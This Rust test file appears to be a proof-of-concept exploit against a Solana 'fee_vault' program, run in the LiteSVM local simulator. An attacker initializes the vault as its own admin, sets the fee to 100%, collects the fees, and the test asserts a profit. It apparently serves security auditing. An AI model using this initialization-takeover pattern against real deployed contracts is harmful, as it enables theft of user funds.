// RG01: the attacker initializes the vault, so the attacker is its admin.
use litesvm::LiteSVM;
use solana_sdk::instruction::Instruction;
use solana_sdk::signature::{Keypair, Signer};
use solana_sdk::transaction::Transaction;

fn send(svm: &mut LiteSVM, ix: Instruction, signers: &[&Keypair]) {
    let payer = signers[0].pubkey();
    let tx = Transaction::new_signed_with_payer(&[ix], Some(&payer), signers, svm.latest_blockhash());
    svm.send_transaction(tx).unwrap();
}

#[test]
fn test_attacker_raises_the_fee() {
    let mut svm = LiteSVM::new();
    svm.add_program(fee_vault::ID, include_bytes!("fee_vault.so"));
    let attacker = Keypair::new();
    svm.airdrop(&attacker.pubkey(), 10_000_000_000).unwrap();
    let init = fee_vault::instruction::Initialize { admin: attacker.pubkey(), fee_bps: 30 };
    send(&mut svm, init_ix(init), &[&attacker]);

    let before = svm.get_balance(&attacker.pubkey()).unwrap();
    send(&mut svm, set_fee_ix(10_000), &[&attacker]);
    send(&mut svm, collect_fees_ix(&attacker.pubkey()), &[&attacker]);
    assert!(svm.get_balance(&attacker.pubkey()).unwrap() > before);
}
